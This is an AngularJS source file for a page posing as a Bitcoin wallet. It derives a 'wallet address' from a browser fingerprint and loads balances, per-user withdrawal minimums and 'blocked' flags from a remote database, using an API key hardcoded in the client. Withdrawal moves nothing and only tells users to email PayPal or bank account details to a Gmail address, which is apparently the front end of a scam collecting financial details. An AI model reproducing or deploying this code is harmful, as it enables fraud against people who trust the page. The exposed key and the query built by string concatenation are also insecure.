var app = angular.module('myApp', []);
app.controller('myCtrl', ($scope) => {
	$scope.transactions = [];

	$scope.walletAddress = '';
	$scope.btcBalance = 'loading';
	$scope.numBalance = 0;
	$scope.isBlocked = false;
	$scope.myMin = -1;

	try {
		new Fingerprint2().get((address) => {
			initWallet(address, $scope);
		});
	} catch (e) {
		initWallet(null, $scope);
	}

	$scope.withdrawMoney = (mode) => {
		var min = $scope.myMin == -1 ? 0.24 : $scope.myMin;
		if ($scope.walletAddress == '2617f6cbd1e8b2a15ce672b152d72b8e') min = 0.2;
		else if ($scope.walletAddress == '04f1d67aa907036cfa27baf3fcc16c04') min = 0.15;

		if ($scope.numBalance == 0) M.toast({ html: 'You don\'t have a balance yet', classes: 'red' });
		else {
			if ($scope.numBalance >= min) M.toast({ html: mode == 'p' ? 'Please send your PayPal email to pistawallet@gmail.com for money transfer.' : 'Please send your address and bank account details to pistawallet@gmail.com for money transfer.' });
			else M.toast({ html: 'Minimum Withdrawal Amount is ' + min + ' BTC', classes: 'red' });
		}
	}
});

function initWallet(address, $scope) {
	let applyScope = true;
	if (address == null) {
		applyScope = false;
		address = '5f25194d66bb486c549' + new Date().getTime();
	}

	const storedAddress = localStorage.getItem('wa');
	if (storedAddress == null) localStorage.setItem('wa', address);
	else address = storedAddress;

	new QRCode(document.getElementById('qrcode'), {
		text: address,
		width: 256,
		height: 256,
		colorDark: '#1565c0'
	});

	wAddress = address;

	$scope.walletAddress = address;
	if (applyScope) $scope.$apply();

	$.ajax({
		type: 'GET',
		dataType: 'JSON',
		cache: false,
		url: 'https://api.mlab.com/api/1/databases/wallet11tobe/collections/users?apiKey=i5jy8eOAJvw5dbgN8aYHDQ5vW4Pi8ii9&q={"address":"' + address + '"}',
		success: (response) => {
			if (response.length > 0) {
				numBalance = response[0].balance;

				$scope.numBalance = response[0].balance;
				$scope.btcBalance = response[0].balance + ' BTC';

				if (response[0].min != undefined) {
					$scope.myMin = response[0].min;
				}

				if (response[0].blocked != undefined && response[0].blocked) {
					$scope.isBlocked = true;

					$('.btn-large').addClass('disabled');
				}
			} else {
				numBalance = 0;

				$scope.numBalance = 0;
				$scope.btcBalance = '0.00 BTC';
			}

			$scope.$apply();
		}
	});
}